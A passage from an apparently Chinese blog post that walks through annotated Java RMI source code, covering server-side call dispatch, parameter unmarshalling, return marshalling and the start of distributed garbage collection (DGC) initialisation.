class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按 RMI/Java 序列化协议从 &#123;<span class="doctag">@link</span> ObjectInput&#125; 读取一个值，并返回与给定 &#123;<span class="doctag">@code</span> type&#125;</span></span><br><span class="line"><span class="comment"> * 兼容的对象。该方法既可用于“参数解组”（server 侧）也可用于“返回值解组”（client 侧）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;规则与理由：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;原始类型&lt;/b&gt;：直接调用 &#123;<span class="doctag">@link</span> ObjectInput&#125; 的对应读方法（如 &#123;<span class="doctag">@code</span> readInt()&#125;）；</span></span><br><span class="line"><span class="comment"> *       由于反射调用需要 &#123;<span class="doctag">@code</span> Object[]&#125;，这里返回的是“装箱类型”（如 &#123;<span class="doctag">@code</span> Integer&#125;）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;String&lt;/b&gt;：若输入流是 &#123;<span class="doctag">@link</span> ObjectInputStream&#125;，优先使用</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@code</span> SharedSecrets.getJavaObjectInputStreamReadString().readString(in)&#125;，</span></span><br><span class="line"><span class="comment"> *       只读取字符串令牌（TC_STRING/TC_LONGSTRING），避免触发通用的对象反序列化路径；</span></span><br><span class="line"><span class="comment"> *       否则退回 &#123;<span class="doctag">@code</span> in.readObject()&#125;（同样能读取字符串/引用/空值）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;其它引用类型（含数组、枚举、可序列化对象、Remote stub 等）&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> *       统一走 &#123;<span class="doctag">@code</span> in.readObject()&#125;；若远端写出的是 &#123;<span class="doctag">@code</span> Remote&#125;，</span></span><br><span class="line"><span class="comment"> *       反序列化得到的将是可用的“存根/动态代理”。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;异常&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 读写错误抛 &#123;<span class="doctag">@link</span> IOException&#125;；类型解析失败抛 &#123;<span class="doctag">@link</span> ClassNotFoundException&#125;。</span></span><br><span class="line"><span class="comment"> * 这两类异常都会沿调用栈被包装为 RMI 的编组/解组异常（如 &#123;<span class="doctag">@code</span> UnmarshalException&#125;）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type 期望的值类型（返回对象与之兼容；原始类型会返回其装箱类型）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in   输入流（通常是 &#123;<span class="doctag">@code</span> MarshalInputStream&#125; 的子类，亦为 &#123;<span class="doctag">@code</span> ObjectInputStream&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 装箱后的原始值、字符串或任意反序列化对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              读取底层流失败</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException   反序列化对象时无法解析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 原始类型：逐一映射到 DataInput 风格的读取方法，并装箱返回</span></span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Double.valueOf(in.readDouble());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 理论不会到达：八种原始类型已覆盖</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2) String：若可用，走专用的只读字符串路径（性能/安全更优），否则退回通用反序列化</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (type == String.class &amp;&amp; in <span class="keyword">instanceof</span> ObjectInputStream) &#123;</span><br><span class="line">        <span class="keyword">return</span> SharedSecrets.getJavaObjectInputStreamReadString()</span><br><span class="line">                           .readString((ObjectInputStream) in);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3) 其余引用类型：统一走对象反序列化（支持 null、引用共享、Remote 替换为 stub 等）</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ol>
<h4 id="服务端部分"><a href="#服务端部分" class="headerlink" title="服务端部分"></a>服务端部分</h4><p>与前面的服务发现过程中的注册中心部分一样，客户端进行远程调用时服务端同样会执行到 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code> 进而调用到 <code>UnicastServerRef#dispatch</code>。</p>
<p>只不过这次在 <code>UnicastServerRef#dispatch</code> 中不会调用 <code>oldDispatch</code> 函数而是继续往下执行。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==== 读取远程调用头部（先读一个 int）====</span></span><br><span class="line">ObjectInput in;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    in = call.getInputStream(); <span class="comment">// 生命周期由 RemoteCall 控制，这里只使用</span></span><br><span class="line">    num = in.readInt();         <span class="comment">// 旧协议: 方法索引；新协议: 负版本标记</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">    <span class="comment">// 统一转成 UnmarshalException，便于上层按 RMI 语义回传</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, readEx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==== 旧协议：需要 skeleton 才能分发 ====</span></span><br><span class="line"><span class="keyword">if</span> (num &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 交由旧协议分发入口：内部会继续读调用头等并完成分发</span></span><br><span class="line">        oldDispatch(obj, call, num);</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 分发完成直接返回</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 客户端按 1.1 说话，但服务端没有 skeleton，协商失败</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">            <span class="string">&quot;skeleton class not found but required for client version&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ==== 新协议（1.2+）：继续读取方法哈希 long ====</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    op = in.readLong(); <span class="comment">// 客户端在 header 中写入的 Method 哈希</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, readEx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先根据哈希从哈希表中找到对应的方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过方法哈希定位服务端可调用的 Method（映射在启动时或类加载时建立）</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> hashToMethod_Map.get(op);</span><br><span class="line"><span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 客户端调用的方法在服务端不受支持（版本不一致/接口变更）</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">        <span class="string">&quot;unrecognized method hash: method not supported by remote object&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>unmarshalParametersChecked</code> 函数对参数进行反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用给定的 MarshalInputStream 反序列化给定实例的给定方法的参数。</span></span><br><span class="line"><span class="comment"> * 在反序列化过程中执行所有额外的检查。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object[] unmarshalParametersChecked(</span><br><span class="line">    DeserializationChecker checker,</span><br><span class="line">    Method method, MarshalInputStream in)</span><br><span class="line"><span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 获取当前方法调用的 ID</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">callID</span> <span class="operator">=</span> methodCallIDCount.getAndIncrement();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建自定义检查器，并设置给输入流</span></span><br><span class="line">    <span class="type">MyChecker</span> <span class="variable">myChecker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyChecker</span>(checker, method, callID);</span><br><span class="line">    in.setStreamChecker(myChecker);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取方法的参数类型</span></span><br><span class="line">        Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个数组来存储反序列化后的参数值</span></span><br><span class="line">        Object[] values = <span class="keyword">new</span> <span class="title class_">Object</span>[types.length];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 依次反序列化每个参数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">            myChecker.setIndex(i);  <span class="comment">// 设置当前参数的索引</span></span><br><span class="line">            values[i] = unmarshalValue(types[i], in);  <span class="comment">// 反序列化当前参数值</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 完成反序列化并结束检查</span></span><br><span class="line">        myChecker.end(callID);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 返回反序列化后的参数数组</span></span><br><span class="line">        <span class="keyword">return</span> values;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 清除输入流中的检查器</span></span><br><span class="line">        in.setStreamChecker(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在 1.2 新协议的参数解组期间，调用栈上只会存在“系统类”（class loader 为 null），</span></span><br><span class="line"><span class="comment"> * 因此告诉 MarshalInputStream 不必去按“栈上第一个非空类加载器”的默认逻辑解析类，</span></span><br><span class="line"><span class="comment"> * 省去无意义的解析与潜在的类加载歧义。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">MarshalInputStream</span> <span class="variable">marshalStream</span> <span class="operator">=</span> (MarshalInputStream) in;</span><br><span class="line">marshalStream.skipDefaultResolveClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果启用了调用日志，打印“对象标识 + 具体方法”</span></span><br><span class="line">logCall(obj, method);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==== 解组参数 ====</span></span><br><span class="line">Object[] params = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可选：读取自定义调用数据（例如上下文扩展/标头等；没有扩展则可能是 no-op）</span></span><br><span class="line">    unmarshalCustomCallData(in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按 Method 签名从流中解出参数（含基本类型与引用类型转换）</span></span><br><span class="line">    params = unmarshalParameters(obj, method, marshalStream);</span><br><span class="line">&#125; <span class="keyword">catch</span> (AccessException aex) &#123;</span><br><span class="line">    <span class="comment">// 兼容性要求：AccessException 不包装进 UnmarshalException</span></span><br><span class="line">    <span class="comment">// 另外丢弃输入流里可能“挂着”的远端引用（避免 GC 泄漏）</span></span><br><span class="line">    ((StreamRemoteCall) call).discardPendingRefs();</span><br><span class="line">    <span class="keyword">throw</span> aex;</span><br><span class="line">&#125; <span class="keyword">catch</span> (java.io.IOException | ClassNotFoundException e) &#123;</span><br><span class="line">    <span class="comment">// 解参数失败：同样丢弃挂起的远端引用，随后包装为 UnmarshalException</span></span><br><span class="line">    ((StreamRemoteCall) call).discardPendingRefs();</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 无论成功与否，都尽早释放输入流（之后不再需要从 in 读取）</span></span><br><span class="line">    call.releaseInputStream();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后反射调用远程对象的方法，然后将结果通过 <code>marshalValue</code> 序列化后写入输出流。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// ==== 在目标远程对象上“上行调用” ====</span></span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 通过反射调用目标方法；用户代码抛出的异常会被包裹在 ITE 中</span></span><br><span class="line">        result = method.invoke(obj, params);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">        <span class="comment">// 透出被调方法的真实异常，让下方统一序列化并回传</span></span><br><span class="line">        <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==== 序列化返回值 ====</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// true 表示“正常返回”分支（protocol 会在此时向对端标记正常返回）</span></span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">        <span class="keyword">if</span> (rtype != <span class="keyword">void</span>.class) &#123;</span><br><span class="line">            marshalValue(rtype, result, out); <span class="comment">// 按返回类型写回</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="comment">// 这里抛 MarshalException 会有一个已知问题：</span></span><br><span class="line">        <span class="comment">// 上面已标记为“正常返回”，此处再回写异常会破坏流的一致性（旧 skeleton 也有同样问题）</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    <span class="comment">// 统一的“异常回传”路径：把任意 Throwable 序列化回客户端</span></span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">origEx</span> <span class="operator">=</span> e;</span><br><span class="line">    logCallException(e); <span class="comment">// 记录服务端异常日志</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// false 表示“异常返回”分支，协议层会写入相应标记</span></span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 Error / RemoteException 包装为带语义的服务端异常类型</span></span><br><span class="line">    <span class="keyword">if</span> (e <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">        e = <span class="keyword">new</span> <span class="title class_">ServerError</span>(<span class="string">&quot;Error occurred in server thread&quot;</span>, (Error) e);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException) &#123;</span><br><span class="line">        e = <span class="keyword">new</span> <span class="title class_">ServerException</span>(<span class="string">&quot;RemoteException occurred in server thread&quot;</span>,</span><br><span class="line">                                (Exception) e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可选：为了安全/体积等需求，剥离堆栈（如果配置了 suppressStackTraces）</span></span><br><span class="line">    <span class="keyword">if</span> (suppressStackTraces) &#123;</span><br><span class="line">        clearStackTraces(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把异常对象写回给客户端（客户端再据此抛/还原）</span></span><br><span class="line">    out.writeObject(e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// AccessException 需要让上传输层把连接标记为不可复用（例如权限失败）</span></span><br><span class="line">    <span class="keyword">if</span> (origEx <span class="keyword">instanceof</span> AccessException) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Connection is not reusable&quot;</span>, origEx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 兜底释放：即使上面已释放过输入流，也再次调用保证稳妥（通常是幂等）</span></span><br><span class="line">    call.releaseInputStream();  <span class="comment">// 兼容老 skeleton 的行为</span></span><br><span class="line">    call.releaseOutputStream(); <span class="comment">// 完成回写后释放输出流</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p><strong>DGC</strong>（Distributed Garbage Collection，分布式垃圾回收）是 RMI 提供的分布式垃圾回收机制，旨在管理远程对象的生命周期，确保远程对象在不再需要时能被自动回收。其主要作用是确保远程对象的生命周期得到正确管理，避免由于客户端和服务器之间的引用关系错误或遗留引用而导致的内存泄漏。</p>
<h4 id="DGC-初始化"><a href="#DGC-初始化" class="headerlink" title="DGC 初始化"></a>DGC 初始化</h4><p>服务端通过 <code>ObjectTable#putTarget</code> 将注册的远程对象放入 <code>objTable</code> 中，里面有默认的 <code>DGCImpl</code> 对象，这个类就是是 RMI 的分布式垃圾回收类。这里分析一下 <code>DGCImpl</code> 对象是什么时候被放到 <code>objTable</code> 中的。</p>
<p>当服务端创建 <code>Target</code> 对象时，<code>permanent</code> 默认为 <code>true</code>，因此会调用 <code>pinImpl</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为远程对象 &#123;<span class="doctag">@code</span> impl&#125; 构造一个带有指定 &#123;<span class="doctag">@link</span> ObjID&#125; 的 &#123;<span class="doctag">@code</span> Target&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;参数含义&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> impl&#125;：真正执行业务逻辑的远程对象实例。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> disp&#125;：入站调用分发器（根据协议/方法哈希把调用路由到 &#123;<span class="doctag">@code</span> impl&#125;）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> stub&#125;：对外暴露给客户端的存根对象（可为 &#123;<span class="doctag">@code</span> null&#125;，视导出策略）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> id&#125;：该远程对象在 &#123;<span class="doctag">@code</span> ObjectTable&#125; 中注册用的全局唯一标识。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> permanent&#125;：生命周期策略：</span></span><br><span class="line"><span class="comment"> *     &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;li&gt;&#123;<span class="doctag">@code</span> true&#125;：将通过 &#123;<span class="doctag">@link</span> #pinImpl()&#125; 额外保持&lt;strong&gt;强引用&lt;/strong&gt;以防本地 GC 回收；</span></span><br><span class="line"><span class="comment"> *           不参与分布式/本地 GC 的自动“摘除”。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;li&gt;&#123;<span class="doctag">@code</span> false&#125;：仅以弱引用跟踪，可被本地 GC 回收；回收后由 reaper 线程据</span></span><br><span class="line"><span class="comment"> *           &#123;<span class="doctag">@code</span> reapQueue&#125; 做清理/反注册。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *     &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *     &lt;em&gt;说明：&lt;/em&gt;“永久”并不强制让服务器常驻；JVM 仍可按正常条件退出。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Target</span><span class="params">(Remote impl, Dispatcher disp, Remote stub, ObjID id, <span class="type">boolean</span> permanent)</span> &#123;</span><br><span class="line">    <span class="comment">// 使用弱引用跟踪 impl 的可达性：</span></span><br><span class="line">    <span class="comment">// 当 impl 不再被应用层强引用且被 GC 回收时，对应 WeakRef 会进入 ObjectTable.reapQueue，</span></span><br><span class="line">    <span class="comment">// 由 ObjectTable 的回收线程做注销（如从对象表移除、释放 LiveRef、通知 DGC 等）。</span></span><br><span class="line">    <span class="built_in">this</span>.weakImpl = <span class="keyword">new</span> <span class="title class_">WeakRef</span>(impl, ObjectTable.reapQueue);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生命周期策略：是否把 impl “钉住”以避免本地 GC 回收导致的自动 unexport</span></span><br><span class="line">    <span class="built_in">this</span>.permanent = permanent;</span><br><span class="line">    <span class="keyword">if</span> (permanent) &#123;</span><br><span class="line">        <span class="comment">// 对“永久”对象建立强引用/keep-alive（具体由 pinImpl 实现），</span></span><br><span class="line">        <span class="comment">// 这样即便没有外部强引用也不会被本地 GC 误收。</span></span><br><span class="line">        pinImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>pinImpl</code> 会进一步调用到 <code>WeakRef#pin</code> 进而调用到 <code>DGCImpl</code> 的静态方法：</p>
